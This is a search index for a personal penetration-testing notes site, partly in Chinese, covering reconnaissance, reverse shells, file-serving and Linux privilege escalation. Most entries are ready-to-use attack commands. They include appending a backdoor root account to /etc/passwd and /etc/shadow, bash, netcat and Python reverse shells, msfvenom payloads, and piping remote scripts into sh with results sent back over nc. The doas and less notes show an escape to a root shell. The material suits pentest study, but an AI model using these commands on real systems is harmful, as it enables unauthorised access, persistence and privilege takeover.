{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Environment Configuration","text":"<ul> <li>ida pro</li> <li>x96dbg</li> <li>010editor</li> <li>vmware workstation<ul> <li>windows</li> <li>kali linux</li> </ul> </li> <li>visual studio 2017<ul> <li>microsoft runtime library</li> </ul> </li> <li>clion</li> <li>pycharm</li> </ul>"},{"location":"Crypto/","title":"Index","text":"<p>All things about cryptography in red teaming.</p>"},{"location":"Crypto/#online-tools","title":"Online tools","text":"<ul> <li>CrackStation</li> <li>CyberChef</li> </ul>"},{"location":"Crypto/gen_passwd/","title":"Generate Password","text":"<ul> <li>openssl \u2192 passwd</li> </ul> <pre><code># generate a user line\nopenssl passwd -1 -salt qwe qwe &gt; hash.txt\n# Append this line into passwd file\necho 'qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd\n</code></pre> <ul> <li>mkpasswd \u2192 shadow</li> </ul> <pre><code># generate a root line\nmkpasswd -m sha-512 qwe\n# change root line in shadow file\necho 'root:$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.:19509:0:99999:7:::' &gt;&gt; /etc/shadow\n</code></pre>"},{"location":"Linux/","title":"Details","text":"<p>regular expression</p> <p>manipulate text:</p> <ul> <li> grep</li> <li> sed</li> <li> awk</li> </ul> <p>shell:</p> <ul> <li>unlisted</li> </ul>"},{"location":"Linux/regexp/","title":"Regular Expression","text":"<p>Online editor:</p> <ul> <li>regexr (Left Q: how to deploy this tool on Github page.)</li> </ul>"},{"location":"Linux/regexp/#basic-regexp","title":"Basic regexp","text":"<ul> <li>\u5339\u914d\u5b57\u7b26</li> <li>\u5339\u914d\u6b21\u6570</li> <li>\u4f4d\u7f6e\u951a\u5b9a</li> </ul> \u7b26\u53f7 \u4f5c\u7528 ^ \u5339\u914d\u884c\u5f00\u5934 $ \u5339\u914d\u884c\u7ed3\u5c3e ^$ \u7a7a\u884c . \u5339\u914d\u4e00\u4e2a\u5b57\u7b26 \\ \u8f6c\u4e49\u5b57\u7b26 * \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u53ca\u4ee5\u4e0a .* \u5339\u914d\u6240\u6709\u5185\u5bb9 ^.* \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u5f00\u5934\u7684\u5185\u5bb9 .*$ \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u7ed3\u5c3e\u7684\u5185\u5bb9 [abc] \u5339\u914d\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 [^abc] \u5339\u914d\u9664\u4e86\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26"},{"location":"Linux/regexp/#extensive-regexp","title":"Extensive regexp","text":"<p><code>grep -E</code></p> \u7b26\u53f7 \u4f5c\u7528 + \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b261\u6b21\u53ca\u4ee5\u4e0a ? \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u62161\u6b21 | \u6216\u8005 () \u5206\u7ec4\u8fc7\u6ee4\uff0c\u5206\u7ec4\u7684\u5185\u5bb9\u53ef\u540e\u7eed\"\\n\"\u5f15\u7528 a{n} a{n,m} a{n,} a{,m} \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b26\u7279\u5b9a\u6b21\u6570"},{"location":"Linux/manipulate_text/awk/","title":"awk","text":""},{"location":"Linux/manipulate_text/awk/#synopsis","title":"SYNOPSIS","text":"<pre><code>awk [-W option] [-F value] [-v var=value] [--] 'program text' [file ...]\nawk [-W option] [-F value] [-v var=value] [-f program-file] [--] [file ...]\n</code></pre> <p>\u7b2cn\u5217\u7684\u4fe1\u606f</p> <ul> <li><code>$0</code></li> <li><code>$1</code>, <code>$2</code>, \u2026</li> <li>\u2026, <code>$(NF-1)</code>, <code>$NF</code></li> </ul> <p>\u5206\u5272\u7b26</p> <ul> <li>\u8f93\u5165\u5206\u9694\u7b26\uff1a\u9ed8\u8ba4\u7a7a\u683c\uff0c\u53d8\u91cf\u540dFS(Field Seperator)</li> <li>\u8f93\u51fa\u5206\u9694\u7b26\uff1aOFS(Output Field Seperator)</li> </ul> <pre><code>awk -F \":\" '{print $1, $2}' filename\nawk -v FS=\":\" '{print $1, $2}' filename\nawk -v OFS=\"-\" '{print $1, $2}' filename\nawk 'BEGIN {OFS=\",\"} {print $1, $2}' filename\n</code></pre>"},{"location":"Linux/manipulate_text/awk/#option","title":"Option","text":"option usage -F val FS, field separator -v var=val assign val to program variable var -f file program text is read from file -- indicate unambiguous end of opts"},{"location":"Linux/manipulate_text/awk/#program-variable","title":"Program variable","text":"Program variable Usage FS Field separator, ' ' OFS Output field separator, ' ' RS Record separator, initially '\\n' ORS Output record separator, '\\n' NF Number of field NR Number of record FNR File number of record FILENAME Current filename ARGC arg count ARGV arg vector"},{"location":"Linux/manipulate_text/awk/#program-structure","title":"Program structure","text":"<p>Program = sequence of pattern {action} pairs and user function definitions</p> <p>Pattern:</p> <ul> <li>BEGIN</li> <li>END</li> <li>expr</li> <li>expr, expr</li> </ul>"},{"location":"Linux/manipulate_text/grep/","title":"grep","text":"<p>SYNOPSIS</p> <pre><code>grep [opts] [pattern] file\n    -i: ignore\n    -o: only print matched\n    -v, --invert-match\n    -E: enable regexp\n    -q, --quite, --silent\n    -n: number line\n    -c: count output line\n</code></pre>"},{"location":"Linux/manipulate_text/sed/","title":"sed","text":"<p>SYNOPSIS</p> <pre><code>sed [opts] [cmd chars] [file]\n</code></pre> <p>Opts</p> \u53c2\u6570 \u4f5c\u7528 -n \u53d6\u6d88\u9ed8\u8ba4\u7684sed\u8f93\u51fa\uff0c\u5e38\u4e0ep\u4e00\u8d77\u4f7f\u7528 -i \u4fee\u6539\u7ed3\u679c\u76f4\u63a5\u5199\u5165\u6587\u4ef6 -e \u591a\u6b21\u7f16\u8f91\uff08\u4e0d\u9002\u7528\u7ba1\u9053\u7b26\uff09 -r \u6269\u5c55\u7248\u6b63\u5219 <p>\u5185\u7f6e\u547d\u4ee4\u5b57\u7b26</p> sed\u5185\u7f6e \u4f5c\u7528 a append\uff0c\u6307\u5b9a\u884c\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c d delete\uff0c\u5220\u9664\u5339\u914d\u884c i insert\uff0c\u6307\u5b9a\u884c\u524d\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c p print\uff0c\u6253\u5370\u5339\u914d\u884c\u5185\u5bb9 s/regexp/text/g \u5339\u914d\u6b63\u5219\u5185\u5bb9\uff0c\u66ff\u6362\u5185\u5bb9\uff0cg\u5168\u5c40\u5339\u914d <p>\u5339\u914d\u8303\u56f4</p> \u8303\u56f4 \u89e3\u6790 \u7a7a\u5730\u5740 \u5168\u6587\u5904\u7406 \u5355\u5730\u5740 \u6307\u5b9a\u6587\u4ef6\u67d0\u4e00\u884c /pattern/ \u88ab\u6a21\u5f0f\u5339\u914d\u5230\u7684\u6bcf\u4e00\u884c \u8303\u56f4\u533a\u95f4 10,20 10,+5 /pattern1/,/pattern2/ \u6b65\u957f 1~2, 2~2, start~step"},{"location":"Pentest/","title":"Details","text":"<p>Core pentest procedures:</p> <ul> <li>Reconnaissance</li> <li>Vulnerabilities</li> <li>Services</li> <li>Privilege Escalation<ul> <li>Linux</li> <li>Windows</li> </ul> </li> </ul> <p>Auxiliary points:</p> <ul> <li>Reverse shell</li> <li>Quick server</li> </ul>"},{"location":"Pentest/#helper-tools","title":"Helper tools","text":"<ul> <li>arsenal, <code>pip install arsenal-cli</code></li> </ul>"},{"location":"Pentest/1.recon/","title":"Index","text":"<ul> <li>nmap</li> </ul> <pre><code>nmap -sn &lt;ip&gt;/24 # arp, arp-scan -l\nnmap -sn --send-ip &lt;ip&gt;/24 # icmp\nnmap -sT --min-rate 10000 -p- &lt;ip&gt; -oA &lt;ports&gt; # | grep open | awk -F '/' '{print $1}' | paste -sd ','\n\nnmap -sT -sV -sC -O -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\nnmap -sU --top-ports 20 &lt;ip&gt; -oA &lt;file&gt;\nnmap --script=vuln -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\n\nnmap -6 --min-rate 10000 -p- &lt;ip&gt; -oA &lt;file&gt;\n</code></pre> <ul> <li>searchsploit</li> </ul> <pre><code>searchsploit &lt;dsc&gt;\nsearchsploit &lt;dsc&gt; -m &lt;num&gt;\n</code></pre>"},{"location":"Pentest/1.recon/cdn/","title":"CDN","text":"<ul> <li>online ping<ul> <li>http://ping.chinaz.com/</li> <li>http://ping.aizhan.com/</li> <li>http://ce.cloud.360.cn/</li> <li>https://ip.tool.chinaz.com/</li> <li>https://get-site-ip.com/</li> <li>https://tools.ipip.net/cdn.php/</li> </ul> </li> <li>nslookup"},{"location":"Pentest/1.recon/dns/","title":"DNS","text":"<ul> <li>local host config<ul> <li>linux/unix/macos: <code>/etc/resolv.conf</code></li> <li>windows: <code>%windir%\\system32\\drivers\\etc\\hosts</code></li> </ul> </li> <li>dig <pre><code>dig @&lt;dns&gt; &lt;domain&gt; [+short]\n</code></pre></li> <li>nslookup <pre><code>nslookup [-qt=A|AAAA|CNAME|MX|.] &lt;target.com&gt; &lt;dns&gt;\n</code></pre></li> <li>whois <pre><code>whois &lt;target.com&gt;\n</code></pre></li> <li>theHaverster<ul> <li>email</li> <li>subdomain</li> <li>name <pre><code>theHarvester -d $DOMAIN_NAME -b google\n</code></pre></li> </ul> </li> <li>crt.sh</li> </ul>"},{"location":"Pentest/1.recon/dns/#domain","title":"Domain","text":"<ul> <li>netcraft: search web by domain</li> </ul>"},{"location":"Pentest/1.recon/dns/#subdomain","title":"Subdomain","text":"<ul> <li>gobuster <pre><code># fzf-wordlists\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n# gobuster\ngobuster dns   -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\ngobuster vhost -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\n</code></pre></li> </ul> <pre><code># Set some variables\ntarget='https://10.6.6.100'\nbase_domain=\"example.com\"\nwordlist=\"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\"\n\n# Run gobuster in VirtualHost enumeration mode\ngobuster vhost -k --domain $base_domain --append-domain -u $target -w $wordlist\n</code></pre>"},{"location":"Pentest/1.recon/os/","title":"OS","text":"<ul> <li>web yes<ul> <li>Windows\u5927\u5c0f\u5199\u4e0d\u654f\u611f</li> <li>\u5de5\u5177\u8bc6\u522b</li> </ul> </li> <li>web no<ul> <li>nmap -O</li> </ul> </li> <li>TTL (not accurate)</li> </ul> <pre><code>1\u3001WINDOWS NT/2000   TTL\uff1a128\n2\u3001WINDOWS 95/98     TTL\uff1a32\n3\u3001UNIX              TTL\uff1a255\n4\u3001LINUX             TTL\uff1a64\n5\u3001WIN7              TTL\uff1a64\n</code></pre> <ul> <li>special port: 22, 139, 445, 1433, 3389</li> </ul>"},{"location":"Pentest/1.recon/path/","title":"Path","text":""},{"location":"Pentest/1.recon/path/#methodology","title":"Methodology","text":"<ul> <li>directory</li> <li>file</li> </ul>"},{"location":"Pentest/1.recon/path/#tools","title":"Tools","text":"<ul> <li>gobuster</li> </ul> <pre><code>sudo gobuster dir -u &lt;ip&gt; --worlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.t -x html,php\n</code></pre> <ul> <li>dirb</li> </ul> <pre><code>dirb &lt;ip&gt;\n</code></pre> <ul> <li>dirsearch</li> </ul> <pre><code>dirsearch -u &lt;ip&gt; -e &lt;ext&gt; [opts]\n\n-t &lt;thead&gt;\n-r, brute-force recursively\n-i &lt;code&gt;, include status codes\n-x &lt;codes&gt;, exclude status codes\n-m &lt;method&gt;\n-d &lt;data&gt;\n-H &lt;headers&gt;\n--user-agent=&lt;ua&gt;\n--cookie=&lt;ck&gt;\n</code></pre> <ul> <li>ffuf</li> </ul> <pre><code>ffuf -fs 185 -c -w \\$(fzf-wordlists) -H 'Host: FUZZ.org' -u \"http://$TARGET/\"\nffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u \"http://$TARGET/FUZZ\" -p 1\n</code></pre> <ul> <li>wfuzz</li> </ul> <pre><code>wfuzz -c -w &lt;dict&gt; --hc 404 &lt;url&gt;?FUZZ=sth\n</code></pre> <ul> <li>feroxbuster</li> </ul> <pre><code>feroxbuster -u &lt;target.com&gt; -x pdf -w &lt;word&gt; -t 50\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;target.com&gt; -mutate 1 -mutate-options /path/to/dictionary.txt\n</code></pre>"},{"location":"Pentest/1.recon/smb/","title":"SMB","text":"<ul> <li>enum4linux</li> </ul> <pre><code>enum4linux -A &lt;ip&gt;\n</code></pre>"},{"location":"Pentest/1.recon/waf/","title":"WAF","text":"<ul> <li>waf00f</li> <li>identYwaf</li> <li>nmap<ul> <li>nmap --script=http-waf-fingerprint</li> <li>nmap --script=http-waf-detect</li> </ul> </li> </ul>"},{"location":"Pentest/1.recon/web/","title":"Web","text":"<ul> <li>whatweb</li> </ul> <pre><code>whatweb [opts] &lt;urls&gt;\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;taget&gt; -p &lt;port&gt; -C all [-useproxy &lt;ip:port&gt;] \\\n    [-id admin:passwd] [-Plugins +apacheversion] [-ssl] -o &lt;output&gt;\n</code></pre>"},{"location":"Pentest/2.0.better_shell/","title":"Index","text":"<pre><code># Host\nrlwrap nc -lvnp 4444\n# Remote\nexport TERM=xterm-color\ndpkg -l | grep python\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n##ctrl+z\nstty raw -echo; fg; reset # back to remote\nstty columns 200 rows 200\n\n# Path and alias\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp\nalias ll='clear ; ls -lsaht --color=auto'\n</code></pre>"},{"location":"Pentest/2.rshell/","title":"Online help","text":"<p>Online rshell</p> <ul> <li>Reverse Shell Generator (revshells.com)</li> </ul> <p>Online shell check</p> <ul> <li>ShellCheck \u2013 shell script analysis tool</li> <li>explainshell.com - match command-line arguments to their help text</li> </ul>"},{"location":"Pentest/2.rshell/#reverse-shell","title":"Reverse Shell","text":"<p>msf gen</p> <p><pre><code>msfvenom -p cmd/unix/reverse_python lhost=&lt;ip&gt; lport=&lt;port&gt; -f raw\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;Host&gt; LPORT=&lt;p&gt; -f elf -o rshell.elf\n</code></pre> several langs</p> <pre><code>bash -i &gt;&amp; /dev/tcp/&lt;local&gt;/2233 0&gt;&amp;1\n\nnc -e /bin/sh &lt;host&gt; 4444\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"Pentest/2.rshell/detail_of_bash_rshell/","title":"Detail of bash rshell","text":"<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1'\n</code></pre> <p>\u5728 Bash \u4e2d\uff0c<code>&gt;&amp;</code> \u662f\u4e00\u79cd\u91cd\u5b9a\u5411\u64cd\u4f5c\u7b26\uff0c\u7528\u4e8e\u5c06\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09\u548c\u6807\u51c6\u9519\u8bef\uff08stderr\uff09\u91cd\u5b9a\u5411\u5230\u540c\u4e00\u4e2a\u4f4d\u7f6e\u3002</p> <ul> <li><code>bash -i</code>\uff1a\u8fd9\u5c06\u542f\u52a8\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 bash shell</li> <li><code>&gt;&amp; /dev/tcp/&lt;host&gt;/1234</code>\uff1a\u8fd9\u5c06 bash shell \u7684\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230 TCP \u8fde\u63a5 :1234\uff1b\u8fd9\u6837\uff0c\u6240\u6709\u5728 bash shell \u4e2d\u6253\u5370\u7684\u5185\u5bb9\u90fd\u4f1a\u53d1\u9001\u5230\u8fd9\u4e2a TCP \u8fde\u63a5 <li><code>0&gt;&amp;1</code>\uff1a\u8fd9\u5c06 bash shell \u7684\u6807\u51c6\u8f93\u5165\uff08stdin\uff09\u91cd\u5b9a\u5411\u5230\u5f53\u524d\u7684\u6807\u51c6\u8f93\u51fa\uff08\u5373 TCP \u8fde\u63a5 :1234\uff09\u3002\u8fd9\u6837\uff0c\u4ece TCP \u8fde\u63a5\u63a5\u6536\u7684\u6240\u6709\u5185\u5bb9\u90fd\u4f1a\u4f5c\u4e3a bash shell \u7684\u8f93\u5165 <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 bash shell\uff0c\u5e76\u5c06\u5176\u8f93\u5165\u3001\u8f93\u51fa\u548c\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a TCP \u8fde\u63a5\u3002\u4ece\u8fd9\u4e2a TCP \u8fde\u63a5\u4e2d\u83b7\u5f97\u7684\u8f93\u51fa\u4f5c\u4e3a shell \u7684\u8f93\u5165\u5e76\u4e14\u6267\u884c\uff0cshell \u6267\u884c\u5f97\u51fa\u7684\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230\u6b64 TCP \u8fde\u63a5\u3002</p> <pre><code>rlwrap sudo nc -lvnp 4444\n</code></pre> <p>\u81f3\u4e8e nc -lvnp 1234\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528 nc\uff08netcat\uff09\u547d\u4ee4\u7684\u4f8b\u5b50\u3002nc \u662f\u4e00\u4e2a\u7528\u4e8e\u5904\u7406 TCP \u548c UDP \u8fde\u63a5\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff1a</p> <ul> <li><code>-l</code> \u9009\u9879\u8ba9 nc \u5728\u6307\u5b9a\u7684\u7aef\u53e3\u4e0a\u76d1\u542c\u8fde\u63a5\u3002</li> <li><code>-v</code> \u9009\u9879\u8ba9 nc \u5728\u5efa\u7acb\u8fde\u63a5\u6216\u63a5\u6536\u6570\u636e\u65f6\u63d0\u4f9b\u8be6\u7ec6\u7684\u4fe1\u606f\u3002</li> <li><code>-n</code> \u9009\u9879\u8ba9 nc \u76f4\u63a5\u4f7f\u7528 IP \u5730\u5740\uff0c\u800c\u4e0d\u8fdb\u884c\u57df\u540d\u89e3\u6790\u3002</li> <li><code>-p</code> \u9009\u9879\u540e\u9762\u8ddf\u7684\u662f nc \u8981\u76d1\u542c\u7684\u7aef\u53e3\u53f7\u3002</li> </ul> <p>\u6240\u4ee5\uff0cnc -lvnp 1234 \u547d\u4ee4\u4f1a\u8ba9 nc \u5728\u7aef\u53e3 1234 \u4e0a\u76d1\u542c\u8fde\u63a5\uff0c\u5e76\u5728\u5efa\u7acb\u8fde\u63a5\u6216\u63a5\u6536\u6570\u636e\u65f6\u63d0\u4f9b\u8be6\u7ec6\u7684\u4fe1\u606f\u3002</p>"},{"location":"Pentest/3.quick_server/","title":"Index","text":"<ul> <li>http</li> </ul> <pre><code>python -m http.server 80\n\nphp -S 0:80\n\nruby -run -ehttpd . -p80\n\nperl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick-&gt;new(port=&gt;80); $s-&gt;mount(\"/\"=&gt;{path=&gt;\".\"}); $s-&gt;start'\n\n# cargo install simple-http-server\nsimple-http-server -p 80\n\n# npm install -g http-server\nhttp-server -p 80\n</code></pre> <ul> <li>smbclient</li> </ul> <pre><code>sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share . # on host\n//&lt;host&gt;/share/nc64.exe -e cmd.exe &lt;remote&gt; 443 # on remote\n</code></pre>"},{"location":"Pentest/4.services/","title":"Index","text":"<p>Common-used services installed for different uses.</p> <ul> <li> SSH</li> <li> WordPress</li> <li> Jetkeins</li> <li> SMB</li> <li> FTP</li> <li> RPC</li> <li> Kerberos</li> </ul>"},{"location":"Pentest/5.vulns/","title":"Index","text":"<p>Vulnerabilities might be used during pentest.</p> <ul> <li> File inclusion</li> <li> SQLi</li> <li> Shellshock</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/","title":"Index","text":"<p>All things about PriEsc on Linux and Windows.</p>"},{"location":"Pentest/6.priviledge_escalation/#priciples","title":"Priciples","text":"<ul> <li>Low privilege modification, high privilege execution;</li> <li>User behavior: Low privilege operations personnel input/store high privilege credentials and related information;</li> <li>Beyond privilege system: Capture/modify credentials and related information at a higher level (in-memory) (e.g. kernel privilege escalation).</li> </ul> <p>\u63d0\u6743\u539f\u7406</p> <ul> <li>\u4f4e\u6743\u9650\u4fee\u6539\uff0c\u9ad8\u6743\u9650\u8fd0\u884c</li> <li>\u7528\u6237\u884c\u4e3a\uff1a\u4f4e\u6743\u9650\u8fd0\u7ef4\u4eba\u5458\u8f93\u5165/\u5b58\u50a8\u9ad8\u6743\u9650\u51ed\u636e\u7b49\u4fe1\u606f</li> <li>\u8d85\u8d8a\u6743\u9650\u4f53\u7cfb\uff1a\u66f4\u4e0a\u5c42\uff08\u5185\u5b58\uff09\u6355\u83b7/\u4fee\u6539\u51ed\u636e\u7b49\u4fe1\u606f\uff08\u5185\u6838\u63d0\u6743\uff09</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#living-off-the-land","title":"Living off the land","text":"<ul> <li>windows: LOLBAS</li> <li>linux: GTFOBins</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#linux-priviledge-mechanism","title":"Linux Priviledge Mechanism","text":"<p>Common mechanism</p> <ul> <li>ugo</li> <li>suid, sgid</li> <li>AppArmor, Selinux</li> <li>ACL</li> </ul> <p>Other mechanism</p> <ul> <li>Grsecurity</li> <li>Pax</li> <li>ExecShield</li> <li>ASLR</li> <li>TOMOYO Linux</li> <li>SMACK</li> <li>Yama</li> <li>CGroups</li> <li>Linux Namespaces</li> <li>StackGuard</li> <li>Proplice</li> <li>seccomp</li> <li>ptrace</li> <li>capsicum</li> <li>Mprotect</li> <li>chroot</li> <li>firejail</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#windows-priviledge-mechanism","title":"Windows Priviledge Mechanism","text":""},{"location":"Pentest/6.priviledge_escalation/linux_sudo/","title":"Linux Sudo Commands","text":""},{"location":"Pentest/6.priviledge_escalation/linux_sudo/#living-off-the-land","title":"Living off the land","text":"<p>GTFOBins</p>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/","title":"enumeration","text":""},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#manual","title":"manual","text":"<ul> <li>user-related<ul> <li>whoami</li> <li>id</li> <li>id user</li> <li>who</li> <li>w</li> <li>last</li> </ul> </li> <li>system-related<ul> <li>uname -a</li> <li>lsb_release -a</li> <li>cat /proc/version</li> <li>cat /etc/issue</li> <li>hostnamectl, hostname</li> <li>ps -ef, ps aux, ps axjf</li> <li>top -n 1</li> </ul> </li> <li>network-related<ul> <li>ip a, ifconfig</li> <li>ip route, route</li> <li>ip neigh, arp -a</li> <li>netstat -a, netstat -l, netstat -at, netstat -au</li> <li>netstat -s</li> <li>netstat -ano</li> </ul> </li> <li>priviledge-related<ul> <li>sudo -l</li> <li>getcap -r / 2&gt;/dev/null</li> <li>cat /etc/passwd</li> <li>cat /etc/shadow</li> </ul> </li> <li>usage-related<ul> <li>ls -liah</li> <li>history</li> </ul> </li> <li>schedule-joibs<ul> <li>cat /etc/crontab</li> </ul> </li> <li>environment<ul> <li>echo $PATH</li> <li>env</li> <li>which python gcc ruby perl find netcat nc wget curl ftp tmux screen 2&gt;/dev/null</li> </ul> </li> <li>find / -perm -u=s -type f 2&gt;/dev/null</li> <li>find / -writable -type -f -not -path \u201c*path*\u201d 2&gt;/dev/null</li> <li>find / -group grp -type f 2&gt;/dev/null</li> <li>cat /etc/fstab</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#script","title":"script","text":"<ul> <li>PEASS-ng</li> <li>LinEnum</li> <li>linux-smart-enumeration</li> <li>linux-exploit-suggester</li> <li>linuxprivchecker</li> <li>unix-privesc-check</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#how-to-use","title":"how to use","text":"<pre><code># from network\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# from local, curl\nsudo python -m http.server 80 # on host\ncurl &lt;host&gt;/linpeas.sh | sh   # on victim\n\n# by nc\nsudo nc -q 5 -lvnp 80 &lt; linpeas.sh # on host\ncat &lt; /dev/tcp/&lt;host&gt;/80 | sh      # on victim\n</code></pre> <pre><code># execute on victim and send output back to host\nnc -lvnp 8899 | tee linpeas.out                # on host\ncurl &lt;host&gt;/linpeas.sh | sh | nc &lt;host&gt; 8899   # on victim\ncat &lt; /dev/tcp/&lt;host&gt;/80 | sh | nc &lt;host&gt; 8899 # on victim\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/","title":"doas related","text":"<p>doas\u53ef\u7528\u4e8eBSD\u7cfbLinux\u53d1\u884c\u7248\uff0c\u63d0\u6743\u601d\u8def\u7c7b\u4f3c\u4e8e <code>sudo -l</code> \u4e2d\u5bfb\u627e\u53ef\u5229\u7528\u7684\u6587\u4ef6</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null # /usr/bin/doas\ncat /etc/doas.conf # config file\n</code></pre> <pre><code>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog\n</code></pre> <pre><code>/usr/bin/less /var/log/authlog # enter less\npress v # enter vim mode\n:!/bin/bash\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/#doas","title":"doas","text":"<p>doas \u662f\u4e00\u4e2a\u7528\u4e8e\u5728 Linux \u7cfb\u7edf\u4e2d\u4ee5\u5176\u4ed6\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u7684\u5de5\u5177\u3002\u5b83\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u4e2a\u6bd4 sudo \u66f4\u7b80\u5355\u3001\u66f4\u5c0f\u5de7\u7684\u66ff\u4ee3\u54c1\u3002 \u4ee5\u4e0b\u662f doas \u7684\u4e00\u4e9b\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff1a</p> <ul> <li>\u5b89\u88c5\uff1a\u4f60\u53ef\u4ee5\u901a\u8fc7\u4f60\u7684\u5305\u7ba1\u7406\u5668\u6765\u5b89\u88c5 doas\u3002\u4f8b\u5982\uff0c\u5728 Debian \u7cfb\u7edf\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 apt-get install doas \u547d\u4ee4\u6765\u5b89\u88c5\u3002</li> <li>\u914d\u7f6e\uff1adoas \u7684\u914d\u7f6e\u6587\u4ef6\u662f /etc/doas.conf\u3002\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e9b\u89c4\u5219\u6765\u63a7\u5236\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 doas \u6765\u6267\u884c\u54ea\u4e9b\u547d\u4ee4\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u6761\u89c4\u5219\u6765\u5141\u8bb8 wheel \u7ec4\u4e2d\u7684\u6240\u6709\u7528\u6237\u4ee5\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff1apermit :wheel\u3002</li> <li>\u4f7f\u7528\uff1a\u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u524d\u9762\u6dfb\u52a0 doas \u6765\u4f7f\u7528 doas \u6267\u884c\u547d\u4ee4\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 doas cmd \u6765\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c cmd \u547d\u4ee4\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/#doasconf","title":"doas.conf","text":"<p>doas \u547d\u4ee4\u7528\u4e8e\u6839\u636e /etc/doas.conf \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u89c4\u5219\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 /etc/doas.conf \u6587\u4ef6\u4e2d\u7684\u89c4\u5219\u6709\u4ee5\u4e0b\u683c\u5f0f\uff1a</p> <pre><code>permit | deny [options] identity [as target] [cmd command [args...]]\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li>permit | 